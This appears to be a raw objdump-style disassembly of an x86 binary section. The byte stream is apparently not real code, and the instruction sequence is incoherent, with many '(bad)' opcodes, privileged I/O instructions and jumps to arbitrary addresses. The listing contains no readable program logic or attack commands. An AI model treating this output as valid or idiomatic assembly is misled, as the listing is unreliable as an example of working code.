  417821:	in     eax,dx
  417822:	push   ds
  417823:	cmc    
  417824:	jmp    0x4177fe
  417826:	sbb    esp,0x84914298
  41782c:	lahf   
  41782d:	mov    ebx,DWORD PTR [edi+0x79]
  417830:	xchg   ecx,eax
  417831:	dec    ebp
  417832:	xchg   DWORD PTR [edx],ecx
  417834:	fadd   DWORD PTR [ecx+0x15]
  417837:	out    dx,al
  417838:	mov    BYTE PTR [eax],bh
  41783a:	mov    ebx,esp
  41783c:	test   esi,ecx
  41783e:	addr16 adc eax,0xf04d08fe
  417844:	mov    ds:0x2123184f,al
  417849:	push   0xf62e3c73
  41784e:	add    bl,BYTE PTR [edi-0x1e6619c8]
  417854:	mov    edi,DWORD PTR [ebx-0x7f3e64b8]
  41785a:	adc    eax,ebp
  41785c:	pop    ecx
  41785d:	into   
  41785e:	cwde   
  41785f:	jmp    0x41781b
  417861:	scas   al,BYTE PTR es:[edi]
  417862:	push   es
  417863:	xchg   ebx,eax
  417864:	aam    0x17
  417866:	jbe    0x4178a6
  417868:	inc    esp
  417869:	(bad)  
  41786b:	ret    
  41786c:	inc    esp
  41786d:	and    bl,ch
  41786f:	dec    edi
  417870:	lea    edi,[esi-0x6711ef25]
  417876:	rol    DWORD PTR [esi],0x59
  417879:	dec    bp
  41787b:	push   es
  41787c:	test   BYTE PTR [ebx-0x12a32d57],ah
  417882:	ins    DWORD PTR es:[edi],dx
  417883:	push   eax
  417884:	test   DWORD PTR [eax+edx*1-0x19],0xe0ced63a
  41788c:	xchg   esp,eax
  41788d:	mov    al,ds:0x232152b9
  417892:	mov    al,ds:0x8d1f95cb
  417897:	add    BYTE PTR [eax-0x6b],dh
  41789a:	or     DWORD PTR ds:0xaccaefa9,0x14
  4178a1:	sub    BYTE PTR [ecx+0x5222c4a8],bl
  4178a7:	mov    ds:0x75e39477,al
  4178ac:	xor    BYTE PTR [ecx],bl
  4178ae:	xlat   BYTE PTR ds:[ebx]
  4178af:	xor    al,0xaa
  4178b1:	test   eax,0x2afff0fc
  4178b6:	cs pop ecx
  4178b8:	jnp    0x4178b7
  4178ba:	rol    DWORD PTR [esi-0x40ae5a1a],cl
  4178c0:	aam    0x39
  4178c2:	mov    ebp,0x54494489
  4178c7:	jae    0x41785a
  4178c9:	inc    esi
  4178ca:	lahf   
  4178cb:	ret    0xe4b9
  4178ce:	mov    ds:0xfb082a22,al
  4178d3:	jo     0x417898
  4178d5:	cmc    
  4178d6:	and    al,cl
  4178d8:	clc    
  4178d9:	mov    al,ds:0x5884a48e
  4178de:	into   
  4178df:	mov    cl,0xe7
  4178e1:	lea    esi,[esi+0x2eb40d21]
  4178e7:	xchg   ebp,eax
  4178e8:	shl    DWORD PTR [ecx],0xb3
  4178eb:	dec    edx
  4178ec:	sbb    al,0xb5
  4178ee:	mov    DWORD PTR [eax+0x7d54b8f5],edx
  4178f4:	sbb    DWORD PTR [edx],edx
  4178f6:	fisub  WORD PTR [ebp+0x3f9ede72]
  4178fc:	test   BYTE PTR [edx-0x1f86b538],bl
  417902:	lock sti 
  417904:	ds push cs
  417906:	add    BYTE PTR [esi-0x2deae5ec],al
  41790c:	xchg   ebp,eax
  41790d:	mov    al,0x8b
  41790f:	arpl   WORD PTR [esi],dx
  417911:	cmp    cl,BYTE PTR [edx+0x384b233e]
  417917:	jle    0x4178a3
  417919:	xor    al,0xd5
  41791b:	js     0x4178c7
  41791d:	pop    ss
  41791e:	xor    al,BYTE PTR [eax-0xa61ffa6]
  417924:	stos   DWORD PTR es:[edi],eax
  417925:	xchg   ebx,eax
  417926:	cmp    DWORD PTR [eax],0x36cbf
  41792c:	push   ebx
  41792d:	cmc    
  41792e:	retf   
  41792f:	or     DWORD PTR fs:[edx+0x18c5cb1d],eax
  417936:	sbb    DWORD PTR ds:0xe905ffde,ebp
  41793c:	xor    eax,DWORD PTR [edx+0x20]
  41793f:	pop    es
  417940:	or     ecx,esi
  417942:	fld    TBYTE PTR [eax+eiz*1+0x13]
  417946:	pop    ds
  417947:	sbb    bl,al
  417949:	push   es
  41794a:	sub    BYTE PTR [edi+edi*2],bl
  41794d:	mov    esp,0x5c9fb935
  417952:	aas    
  417953:	mov    ds:0xccdf93ad,eax
  417958:	repnz aad 0xc7
  41795b:	imul   esp,DWORD PTR [ecx],0xffffff9b
  41795e:	pop    ebp
  41795f:	out    dx,al
  417960:	xor    edi,DWORD PTR [esi+0x3fc9e045]
  417966:	popf   
  417967:	xchg   esp,eax
  417968:	(bad)  
  417969:	xchg   ebp,eax
  41796a:	mov    ah,0x3a
  41796c:	add    DWORD PTR ds:0x6961ba22,0xd3e6b807
  417976:	bound  edx,QWORD PTR [ebp+0xb2c15f3]
  41797c:	mov    edi,0xe4705035
  417981:	mov    al,ds:0xa659ec08
  417986:	mov    cs:0xddb9114e,eax
  41798c:	cli    
  41798d:	test   DWORD PTR [ebx+0x720a465d],eax
  417993:	push   0xffffffc1
  417995:	xchg   DWORD PTR [ecx-0x767dc35b],esp
  41799b:	mov    ecx,ebp
  41799d:	pop    ds
  41799e:	sub    BYTE PTR [edi-0x15],bh
  4179a1:	mov    cr0,ebx
  4179a4:	cvtps2pi mm4,xmm4
  4179a7:	mov    ss,WORD PTR [edi-0x74fdf2d]
  4179ad:	lahf   
  4179ae:	inc    eax
  4179af:	ds jnp 0x41799e
  4179b2:	mov    ah,0xb6
  4179b4:	sahf   
  4179b5:	cmp    dh,BYTE PTR [ebx-0x54cc1ed6]
  4179bb:	test   DWORD PTR gs:[esi],eax
  4179be:	ja     0x4179aa
  4179c0:	sub    BYTE PTR [ebp-0x1f],bl
  4179c3:	retf   0xcc4f
  4179c6:	sbb    esi,DWORD PTR [edx]
  4179c8:	(bad)  
  4179c9:	arpl   WORD PTR [ebx-0x2b],ax
  4179cc:	popf   
  4179cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179ce:	les    ecx,FWORD PTR [ebp+eiz*8-0x60]
  4179d2:	dec    esp
  4179d3:	lds    ebx,FWORD PTR [edx-0x21bdfecc]
  4179d9:	out    0x14,al
  4179db:	ret    
  4179dc:	push   ebx
  4179dd:	dec    edi
  4179de:	pop    esi
  4179df:	int3   
  4179e0:	je     0x41798b
  4179e2:	push   esp
  4179e3:	shl    DWORD PTR [ebp+ebp*4+0x35],cl
  4179e7:	mov    esi,0xaa758a23
  4179ec:	push   ecx
  4179ed:	jecxz  0x4179fc
  4179ef:	ror    DWORD PTR [esi+0x7e50a91b],cl
  4179f5:	rcr    BYTE PTR [ebp+edx*2+0x14],1
  4179f9:	mov    ebp,0x7477d3a4
  4179fe:	push   es
  4179ff:	push   edx
  417a00:	je     0x41799e
  417a02:	fscale 
  417a04:	or     DWORD PTR [edi+ebp*8],ebx
  417a07:	fcom   QWORD PTR [esi]
  417a09:	mov    cl,BYTE PTR es:[eax+0x1b2f1089]
  417a10:	add    DWORD PTR [eax-0x1c],esp
  417a13:	shl    DWORD PTR [eax-0x1680edeb],0x4d
  417a1a:	lods   al,BYTE PTR ds:[esi]
  417a1b:	xchg   bh,al
  417a1d:	adc    bh,al
  417a1f:	push   0x31bb1ff9
  417a24:	mov    al,ds:0x8d2f80e2
  417a29:	aam    0x14
  417a2b:	xchg   edx,eax
  417a2c:	and    BYTE PTR [ebp-0x3567ed89],bl
  417a32:	and    eax,0x324aad70
  417a37:	mov    cl,0x5d
  417a39:	fnstenv [edx+edi*1]
  417a3c:	xchg   edx,eax
  417a3d:	sbb    al,0xb1
  417a3f:	iret   
  417a40:	das    
  417a41:	dec    esp
  417a42:	mov    eax,ds:0xd2374603
  417a47:	sub    BYTE PTR gs:[ecx-0x15],dh
  417a4b:	sub    BYTE PTR [ecx+0x1bcb5ab0],ah
  417a51:	push   ds
  417a52:	inc    esp
  417a53:	icebp  
  417a54:	mov    ecx,0x89ce9b4
  417a59:	inc    esp
  417a5a:	dec    ecx
  417a5b:	(bad)  
  417a5d:	fs popa 
  417a5f:	xchg   esp,eax
  417a60:	dec    esp
  417a61:	js     0x417a8e
  417a63:	mov    WORD PTR [eax-0x7c],ss
  417a66:	(bad)  
  417a67:	in     eax,0xdb
  417a69:	sbb    esi,DWORD PTR [eiz*2-0x4693b117]
  417a70:	jecxz  0x4179f4
  417a72:	and    eax,0x6f5be198
  417a77:	or     DWORD PTR [edx+0xb4404c],eax
  417a7d:	int3   
  417a7e:	mov    dl,0x87
  417a80:	aaa    
  417a81:	das    
  417a82:	sub    al,0x7a
  417a84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a85:	or     bl,cl
  417a87:	(bad)  
  417a88:	scas   al,BYTE PTR es:[edi]
  417a89:	add    eax,0x6f8738d2
  417a8e:	add    edi,DWORD PTR [edi+0x4cbc32a8]
  417a94:	push   0xcb4a78df
  417a99:	mov    esp,0xfbc49b67
  417a9e:	aas    
  417a9f:	adc    al,0xcd
  417aa1:	cld    
  417aa2:	loop   0x417af1
  417aa4:	pop    ecx
  417aa5:	and    al,0x7
  417aa7:	sbb    edi,DWORD PTR fs:[ecx+0x12]
  417aab:	bound  ecx,QWORD PTR [edi-0x66]
  417aae:	jmp    0x9fb:0xd791ed99
  417ab5:	ss pushf 
  417ab7:	or     ebx,0xffffffb8
  417aba:	mov    BYTE PTR ds:0xc20f134d,bl
  417ac0:	mov    ah,0x20
  417ac2:	call   0xf5ee456b
  417ac7:	sbb    bl,ah
  417ac9:	mov    dl,0x16
  417acb:	leave  
  417acc:	ins    DWORD PTR es:[edi],dx
  417acd:	sbb    BYTE PTR [eax+0x24b13042],al
  417ad3:	jmp    0x417af4
  417ad5:	sub    ch,BYTE PTR [esi+0x41734c57]
  417adb:	mov    edx,0x151464d2
  417ae0:	adc    ebx,DWORD PTR [ebp+0x5c]
  417ae3:	dec    eax
  417ae4:	fwait
  417ae5:	jg     0x417b3e
  417ae7:	loope  0x417ad8
  417ae9:	mov    edi,0xf9f1c567
  417aee:	cmp    eax,ebp
  417af0:	xchg   edx,eax
  417af1:	mov    ds:0x6e663c8c,eax
  417af6:	jno    0x417b73
  417af8:	out    0xc6,al
  417afa:	cdq    
  417afb:	stos   DWORD PTR es:[edi],eax
  417afc:	arpl   WORD PTR [edx+0x562650e3],si
  417b02:	shl    DWORD PTR [edi],cl
  417b04:	add    esp,DWORD PTR [ebp-0x7d12317d]
  417b0a:	in     al,0x83
  417b0c:	pop    esi
  417b0d:	mov    al,0x91
  417b0f:	fsub   QWORD PTR [edi+0x3a]
  417b12:	mov    edi,0xc53b945f
  417b17:	int    0x26
  417b19:	push   ebx
  417b1a:	call   0xb9f3dcd3
  417b1f:	ins    BYTE PTR es:[edi],dx
  417b20:	xchg   ebx,eax
  417b21:	xor    al,0x96
  417b23:	adc    BYTE PTR [ecx+0x3f],ch
  417b26:	xchg   ebx,eax
  417b27:	es stc 
  417b29:	xlat   BYTE PTR ds:[ebx]
  417b2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b2b:	xchg   ecx,eax
  417b2c:	or     al,0x58
  417b2e:	cmp    DWORD PTR [edx+ecx*4],edi
  417b31:	lods   eax,DWORD PTR ds:[esi]
  417b32:	jbe    0x417b03
  417b34:	(bad)  
  417b35:	out    dx,eax
  417b36:	fcmovne st,st(3)
  417b38:	sbb    esp,edi
  417b3a:	shl    ah,0xf5
  417b3d:	(bad)  
  417b3f:	push   ebp
  417b40:	and    eax,0xdefb0883
  417b45:	or     BYTE PTR [ecx-0x25ee61ec],dl
  417b4b:	sbb    eax,0xf35932f2
  417b50:	and    eax,0x35eb78e0
  417b55:	in     eax,0x94
  417b57:	ja     0x417b65
  417b59:	retf   
  417b5a:	push   cs
  417b5b:	sub    eax,DWORD PTR [ecx-0x2a]
  417b5e:	nop
  417b5f:	cmp    DWORD PTR [edx+0x75],esi
  417b62:	test   BYTE PTR [edi+0x140ebac2],0xf8
  417b69:	pop    ds
  417b6a:	(bad)  
  417b6b:	idiv   DWORD PTR [ecx]
  417b6d:	call   DWORD PTR [eax+0x2a]
  417b70:	neg    DWORD PTR [ebx]
  417b72:	cmp    eax,0x1c1ec78
  417b77:	fst    DWORD PTR ds:0xdef32222
  417b7d:	hlt    
  417b7e:	out    dx,eax
  417b7f:	inc    eax
  417b80:	xchg   BYTE PTR [ebx+0x65],dl
  417b83:	jne    0x417ba5
  417b85:	dec    edi
  417b86:	add    BYTE PTR [edx-0x4f],dl
  417b89:	scas   eax,DWORD PTR es:[edi]
  417b8a:	or     DWORD PTR [eax-0x752f5403],ebx
  417b90:	jns    0x417b90
  417b92:	mov    al,fs:0xf161925f
  417b98:	iret   
  417b99:	sbb    cl,BYTE PTR [ebx]
  417b9b:	fcom   st(4)
  417b9d:	test   BYTE PTR [esi],dh
  417b9f:	pop    esi
  417ba0:	sub    BYTE PTR [eax],0xd9
  417ba3:	call   0x1aea:0x9720c55d
  417baa:	mov    ch,0x7d
  417bac:	xor    eax,0xe42ae8be
  417bb1:	push   ebx
  417bb2:	sub    edi,esp
  417bb4:	xor    ebx,ebp
  417bb6:	sbb    BYTE PTR [eax],cl
  417bb8:	adc    al,0x29
  417bba:	jbe    0x417c33
  417bbc:	pop    ss
  417bbd:	std    
  417bbe:	sub    eax,0xaefb3357
  417bc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bc4:	jmp    0x9784c9b7
  417bc9:	xchg   ebp,eax
  417bca:	and    cl,BYTE PTR [edi-0x1d74d100]
  417bd0:	iret   
  417bd1:	sub    DWORD PTR [ebx],ebp
  417bd3:	shr    BYTE PTR ds:[eax+0x791dbf25],1
  417bda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417bdb:	push   0x8
  417bdd:	or     ch,BYTE PTR es:[ebp-0x40ef8f1]
  417be4:	sub    BYTE PTR [edi],al
  417be6:	mov    eax,0xedb6c59c
  417beb:	mov    BYTE PTR [edx],bh
  417bed:	lahf   
  417bee:	fadd   QWORD PTR [ecx]
  417bf0:	pop    ss
  417bf1:	jns    0xe4c85a58
  417bf7:	stos   BYTE PTR es:[edi],al
  417bf8:	xchg   edx,eax
  417bf9:	xor    ebx,DWORD PTR [eax+ebp*1+0x2a]
  417bfd:	cmp    ah,BYTE PTR [ebp+0x14]
  417c00:	div    DWORD PTR [edx+0x22]
  417c03:	out    0xdc,eax
  417c05:	pushf  
  417c06:	imul   edx,DWORD PTR [ecx+eax*2],0x9d06ba80
  417c0d:	jecxz  0x417c4d
  417c0f:	stc    
  417c10:	jns    0x417b94
  417c12:	stos   DWORD PTR es:[edi],eax
  417c13:	cmp    eax,0x6b25822f
  417c18:	push   ds
  417c19:	fistp  WORD PTR [ebx-0x68741dd4]
  417c1f:	jg     0x417c3e
  417c21:	xadd   BYTE PTR [ecx-0x4],ch
  417c25:	je     0x417c3d
  417c27:	loopne 0x417bb6
  417c29:	(bad)  
  417c2a:	es aam 0x95
  417c2d:	leave  
  417c2e:	repz je 0x417ca0
  417c31:	jmp    0x417bb5
  417c33:	pop    esp
  417c34:	jecxz  0x417c06
  417c36:	sbb    al,al
  417c38:	and    bl,dh
  417c3a:	add    al,BYTE PTR [ebp-0x28]
  417c3d:	mov    edx,0x82b2a3d4
  417c42:	cwde   
  417c43:	sub    ch,ch
  417c45:	push   cs
  417c46:	inc    edx
  417c47:	xor    ebp,DWORD PTR [esi-0x758ef056]
  417c4d:	xchg   BYTE PTR [ecx-0x437108b3],ch
  417c53:	cmp    DWORD PTR [ecx],eax
  417c55:	lock sub BYTE PTR [esi],bl
  417c58:	mov    dl,0x3b
  417c5a:	cmp    eax,DWORD PTR [edi]
  417c5c:	or     BYTE PTR [edx+esi*2-0x5d],0x75
  417c61:	lds    esp,FWORD PTR [edi]
  417c63:	pop    ebp
  417c64:	ror    BYTE PTR [edx-0x3ab0c1b6],1
  417c6a:	gs in  eax,dx
  417c6c:	aad    0xde
  417c6e:	inc    esi
  417c6f:	xchg   DWORD PTR [esi],eax
  417c71:	test   ebx,ebx
  417c73:	fsub   DWORD PTR [edi-0x365b6ed0]
  417c79:	xchg   ebp,eax
  417c7a:	(bad)  
  417c7b:	pop    edx
  417c7c:	test   BYTE PTR [edi+0x21],bl
  417c7f:	scas   eax,DWORD PTR es:[edi]
  417c80:	cmp    BYTE PTR [edi+edx*4-0x77103797],bl
  417c87:	(bad)  
  417c88:	mov    bl,0x35
  417c8a:	pop    edx
  417c8b:	jle    0x417cf6
  417c8d:	cld    
  417c8e:	push   eax
  417c8f:	(bad)  
  417c90:	sbb    eax,0x2c30cdf4
  417c95:	mov    ebp,0x8da08828
  417c9a:	pop    ebx
  417c9b:	cmp    ch,cl
  417c9d:	inc    ebp
  417c9e:	retf   0xd412
  417ca1:	scas   al,BYTE PTR es:[edi]
  417ca2:	outs   dx,BYTE PTR ds:[esi]
  417ca3:	fisubr DWORD PTR [ebp+0x10]
  417ca6:	inc    eax
  417ca7:	icebp  
  417ca8:	inc    ebx
  417ca9:	cs mov bh,0x4c
  417cac:	xor    DWORD PTR [edi-0x21e53c0d],ecx
  417cb2:	int3   
  417cb3:	sbb    DWORD PTR [esi+0x7116ad3f],esp
  417cb9:	test   eax,0x3af367b3
  417cbe:	push   ss
  417cbf:	and    BYTE PTR [edx+0x66],0x36
  417cc3:	jae    0x417c90
  417cc5:	icebp  
  417cc6:	shr    esi,cl
  417cc8:	imul   eax,DWORD PTR [esi+0x68],0xa5c13a65
  417ccf:	mov    ds:0xb8f1486c,al
  417cd4:	adc    BYTE PTR [edx],cl
  417cd6:	sbb    eax,0xfbdf6bcf
  417cdb:	push   cs
  417cdc:	xor    bh,BYTE PTR [ecx-0x4d]
  417cdf:	dec    edx
  417ce0:	mov    edi,0x706990cd
  417ce5:	mov    ds:0x62caf6dc,eax
  417cea:	pop    ds
  417ceb:	jp     0x417ce5
  417ced:	and    DWORD PTR [ebp-0x4b],edi
  417cf0:	cs pop ds
  417cf2:	jbe    0x417d5c
  417cf4:	rcr    DWORD PTR [ecx+0x76],1
  417cf7:	cmp    dh,BYTE PTR [eax]
  417cf9:	les    eax,FWORD PTR [esi+0x1]
  417cfc:	pop    ds
  417cfd:	jecxz  0x417d4c
  417cff:	call   0x5bc9a696
  417d04:	leave  
  417d05:	mov    cl,0x6a
  417d07:	daa    
  417d08:	leave  
  417d09:	pushf  
  417d0a:	jnp    0x417d35
  417d0c:	xor    eax,0x939de4b4
  417d11:	mov    al,0x4e
  417d13:	stos   DWORD PTR es:[edi],eax
  417d14:	add    esi,DWORD PTR [edx*8+0x27024488]
  417d1b:	sti    
  417d1c:	mov    WORD PTR [edi-0xa],cs
  417d1f:	out    dx,al
  417d20:	or     edx,DWORD PTR [ebx+esi*4+0x2e]
  417d24:	sbb    DWORD PTR [ebx-0xc],0x7b
  417d28:	js     0x417d30
  417d2a:	adc    BYTE PTR [edi],al
  417d2c:	gs aam 0xeb
  417d2f:	cdq    
  417d30:	jp     0x417d5b
  417d32:	pop    eax
  417d33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d34:	pop    edx
  417d35:	inc    ebx
  417d36:	test   DWORD PTR [edi+0x4f],esi
  417d39:	test   DWORD PTR [edi-0x2e5139ad],0x1c9644b0
  417d43:	mov    edx,0x9b7c15c4
  417d48:	test   eax,0xecc86f9a
  417d4d:	sbb    eax,0xe301ec5c
  417d52:	or     al,0xe5
  417d54:	(bad)  
  417d56:	in     al,0xc
  417d58:	xchg   esp,eax
  417d59:	fidivr WORD PTR [esi]
  417d5b:	call   0x1c3dc633
  417d60:	int    0x75
  417d62:	std    
  417d63:	sub    DWORD PTR [edx-0x3c],0x8f523b04
  417d6a:	daa    
  417d6b:	lock int3 
  417d6d:	jmp    0x417d8b
  417d6f:	push   edx
  417d70:	retf   0x2d48
  417d73:	add    eax,0x1efcdd4c
  417d78:	push   edi
  417d79:	pop    eax
  417d7a:	sbb    bl,BYTE PTR [ebp+0x24]
  417d7d:	and    BYTE PTR [eax+0x1fc495bf],dh
  417d83:	retf   0x4381
  417d86:	fidiv  DWORD PTR [edi+0x3]
  417d89:	pop    edi
  417d8a:	hlt    
  417d8b:	or     eax,0x8e0b2e6
  417d90:	and    bh,dl
  417d92:	adc    bh,BYTE PTR [esi]
  417d94:	or     DWORD PTR fs:[ecx],ebx
  417d97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d98:	jns    0x417d2c
  417d9a:	outs   dx,DWORD PTR ds:[esi]
  417d9b:	mov    edx,0x8f325d4e
  417da0:	mov    eax,ds:0x8cf98ca0
  417da5:	retf   
  417da6:	sbb    al,0x60
  417da8:	push   edi
  417da9:	adc    ebp,ebx
  417dab:	pop    edx
  417dac:	cld    
  417dad:	sbb    eax,0xd7791980
  417db2:	ror    DWORD PTR [edx-0x43],cl
  417db5:	daa    
  417db6:	pop    ebp
  417db7:	dec    esi
  417db8:	aas    
  417db9:	sahf   
  417dba:	adc    eax,0x401e9cb7
  417dbf:	les    esi,FWORD PTR [ebx-0x42d759f2]
  417dc5:	rcl    DWORD PTR [ebp-0x1],1
  417dc8:	xchg   esp,eax
  417dc9:	lock fmulp st(1),st
  417dcc:	dec    esi
  417dcd:	pop    eax
  417dce:	and    al,0x4b
  417dd0:	int3   
  417dd1:	out    0x77,eax
  417dd3:	stc    
  417dd4:	fst    DWORD PTR [ebp+0x31fd9fb8]
  417dda:	pop    ds
  417ddb:	sahf   
  417ddc:	(bad)  
  417ddd:	cmp    DWORD PTR [ecx],ebx
  417ddf:	mov    eax,0x77ee743e
  417de4:	pop    ss
  417de5:	sub    DWORD PTR [edx+0x29e07913],ebx
  417deb:	cwde   
  417dec:	adc    eax,0x53486da
  417df1:	push   esp
  417df3:	dec    edx
  417df4:	pusha  
  417df5:	stc    
  417df6:	and    al,0xa
  417df8:	stc    
  417df9:	sbb    al,0x9
  417dfb:	inc    edi
  417dfc:	pop    edx
  417dfd:	fisttp WORD PTR [edi]
  417dff:	aad    0x31
  417e01:	fadd   DWORD PTR [esi]
  417e03:	mov    BYTE PTR [ecx],ah
  417e05:	ret    
  417e06:	scas   al,BYTE PTR es:[edi]
  417e07:	out    dx,eax
  417e08:	(bad)  
  417e09:	push   ds
  417e0a:	call   DWORD PTR [edx-0x60abb781]
  417e10:	dec    ecx
  417e11:	cmp    ah,BYTE PTR [esi]
  417e13:	jmp    0x525afc43
  417e18:	xchg   esp,eax
  417e19:	(bad)  
  417e1a:	pop    ebp
  417e1b:	das    
  417e1c:	aas    
  417e1d:	(bad)  
  417e1e:	pop    eax
  417e1f:	test   eax,0xa4669ad9
  417e24:	int    0x1a
  417e26:	fucomip st,st(1)
  417e28:	sbb    edx,DWORD PTR [ecx-0x5b]
  417e2b:	mov    dh,0xa6
  417e2d:	mov    ch,0xa8
  417e2f:	xchg   esp,eax
  417e30:	jno    0x417e4e
  417e32:	jle    0x417ea8
  417e34:	jbe    0x417ded
  417e36:	add    al,0xb6
  417e38:	call   0x43336563
  417e3d:	mov    edi,?
  417e3f:	sbb    edx,ebx
  417e41:	dec    ecx
  417e42:	mov    al,ds:0x8fbbe1f0
  417e47:	sub    eax,0x9793a0f9
  417e4c:	cmp    edi,DWORD PTR ds:0xb4b1d28f
  417e52:	ins    BYTE PTR es:[edi],dx
  417e53:	push   cs
  417e54:	icebp  
  417e55:	aas    
  417e56:	xchg   BYTE PTR [ebx+0x73052e62],bl
  417e5c:	popa   
  417e5d:	inc    esi
  417e5e:	mov    dh,0x5b
  417e60:	xchg   ebp,eax
  417e61:	mov    dl,0xd4
  417e63:	out    dx,eax
  417e64:	fs xchg edi,eax
  417e66:	scas   al,BYTE PTR es:[edi]
  417e67:	lods   al,BYTE PTR ds:[esi]
  417e68:	mov    dl,0xd0
  417e6a:	imul   ebx,DWORD PTR [ecx+0x36],0xffffffd3
  417e6e:	pop    edi
  417e6f:	(bad)  
  417e70:	jae    0x417ee7
  417e72:	in     eax,dx
  417e73:	retf   
  417e74:	or     eax,DWORD PTR [esi-0x5b3cdef5]
  417e7a:	rol    DWORD PTR [edi],cl
  417e7c:	jno    0x417e0e
  417e7e:	cmp    esp,DWORD PTR [eax-0x2b]
  417e81:	mov    edx,0x6d34ccbb
  417e86:	call   0x774d:0x12d08083
  417e8d:	sti    
  417e8e:	dec    ecx
  417e8f:	enter  0xdc85,0x3e
  417e93:	lea    esi,[edx-0x6f]
  417e96:	xchg   esp,eax
  417e97:	push   edi
  417e98:	and    cl,al
  417e9a:	push   es
  417e9b:	dec    edx
  417e9c:	dec    eax
  417e9d:	inc    ebx
  417e9e:	xchg   esi,eax
  417e9f:	jno    0x417efd
  417ea1:	pop    ds
  417ea2:	mov    dl,BYTE PTR [eax]
  417ea4:	js     0x417ed4
  417ea6:	cmp    ebx,DWORD PTR [ebx]
  417ea8:	dec    edi
  417ea9:	ds xchg edi,eax
  417eab:	cmp    ch,BYTE PTR [ecx+0x51]
  417eae:	sbb    al,0x65
  417eb0:	fisub  WORD PTR [edi-0x65]
  417eb3:	xchg   DWORD PTR [ebx-0x8205a3],ecx
  417eb9:	sub    BYTE PTR [edi+0x174213bc],0x44
  417ec0:	pop    ecx
  417ec1:	loop   0x417e9c
  417ec3:	pop    ds
  417ec4:	out    0x4b,al
  417ec6:	pusha  
  417ec7:	or     eax,0x1e992306
  417ecc:	pushf  
  417ecd:	push   cs
  417ece:	lods   eax,DWORD PTR ds:[esi]
  417ecf:	and    esi,DWORD PTR [ecx]
  417ed1:	ror    DWORD PTR [esi+0x61cef65b],0x8b
  417ed8:	in     eax,dx
  417ed9:	or     BYTE PTR [edx],dl
  417edb:	(bad)  
  417edc:	in     al,dx
  417edd:	pusha  
  417ede:	or     ah,BYTE PTR [edx+ebp*1]
  417ee1:	mov    eax,0x2f9500e7
  417ee6:	ret    0x9a6a
  417ee9:	out    dx,al
  417eea:	jle    0x417e82
  417eec:	or     eax,esp
  417eee:	(bad)  [eax+0x6c]
  417ef1:	xor    DWORD PTR [ebx+0x7d70bf0d],ebp
  417ef7:	sub    edx,DWORD PTR [ebp+0x2ccfee50]
  417efd:	lsl    esi,WORD PTR [ecx]
  417f00:	jmp    0x66c1:0x9a0b2e66
  417f07:	xor    edx,DWORD PTR [ecx]
  417f09:	mov    ecx,0xc78c344
  417f0e:	xchg   DWORD PTR [esi],esi
  417f10:	jbe    0x417f07
  417f12:	push   eax
  417f13:	push   edx
  417f14:	add    ecx,DWORD PTR [ecx-0x19]
  417f17:	mov    esi,ebp
  417f19:	lahf   
  417f1a:	sbb    BYTE PTR [edi+0x16],dl
  417f1d:	mov    ecx,DWORD PTR [esi]
  417f1f:	div    DWORD PTR [esp+ecx*8+0x553616db]
  417f26:	push   ds
  417f27:	xchg   edi,eax
  417f28:	dec    edi
  417f29:	and    BYTE PTR [ecx+edx*4-0xa],ch
  417f2d:	jl     0x417f4e
  417f2f:	mov    al,ds:0x4ef80e43
  417f34:	inc    edx
  417f35:	cmp    BYTE PTR [esi+ebp*1],bl
  417f38:	lock fsubp st(7),st
  417f3b:	enter  0x684d,0x23
  417f3f:	(bad)  
  417f40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f41:	cli    
  417f42:	inc    BYTE PTR fs:[edi]
  417f45:	push   ss
  417f46:	imul   edx,eax,0x2c4f8749
  417f4c:	std    
  417f4d:	dec    esi
  417f4e:	adc    BYTE PTR [edx],cl
  417f50:	adc    eax,0xa242d117
  417f55:	add    bh,bh
  417f57:	repnz add BYTE PTR [edx-0x4e],dl
  417f5b:	pusha  
  417f5c:	xor    bl,bl
  417f5e:	pop    ecx
  417f5f:	mov    dl,0x8f
  417f61:	sub    eax,0x8dc599b1
  417f66:	sub    ecx,0xb448289c
  417f6c:	mov    ds:0xf8319ba8,eax
  417f71:	jge    0x417fc6
  417f73:	jns    0x417f49
  417f75:	rcr    ebp,1
  417f77:	ret    0xde25
  417f7a:	jno    0x417fd8
  417f7c:	sub    al,BYTE PTR ds:0xb4360aa6
  417f82:	(bad)
  417f86:	jle    0x417fa7
  417f88:	xchg   ecx,eax
  417f89:	popa   
  417f8a:	adc    ah,BYTE PTR [ebp+edx*1-0x11440054]
  417f91:	call   0xd0d6c38
  417f96:	(bad)  [edi]
  417f98:	hlt    
  417f99:	jl     0x417f35
  417f9b:	xor    al,0xbe
  417f9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f9e:	ret    
  417f9f:	inc    esi
  417fa0:	mov    ebx,0x95a73b42
  417fa5:	mov    ch,0xc9
  417fa7:	mov    bh,BYTE PTR [ecx-0x74d9b11d]
  417fad:	mov    ss,WORD PTR [ecx]
  417faf:	inc    ecx
  417fb0:	and    al,cl
  417fb2:	jle    0x417f74
  417fb4:	outs   dx,DWORD PTR ds:[esi]
  417fb5:	in     al,dx
  417fb6:	pop    esp
  417fb7:	nop
  417fb8:	aas    
  417fb9:	sub    DWORD PTR [edi-0x72],ebp
  417fbc:	or     eax,0xfd32bd42
  417fc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fc2:	jl     0x417f5b
  417fc4:	cmp    eax,0x6ffe162e
  417fc9:	gs imul eax,esi,0xffffffeb
  417fcd:	pop    ebp
  417fce:	or     eax,0x14f8e145
  417fd3:	(bad)  
  417fd4:	arpl   ax,si
  417fd6:	ins    BYTE PTR es:[edi],dx
  417fd7:	mov    al,0x46
  417fd9:	sub    al,0xaf
  417fdb:	pop    es
  417fdc:	dec    ebp
  417fdd:	call   0x321302ee
  417fe2:	aas    
  417fe3:	fdivr  QWORD PTR [ebx+0x6b]
  417fe6:	push   eax
  417fe7:	mov    eax,0xebfa956e
  417fec:	test   BYTE PTR [esp+ebp*1-0x6d],al
  417ff0:	ds fmul st,st(6)
  417ff3:	or     BYTE PTR fs:0xcbd7aa12,0xf1
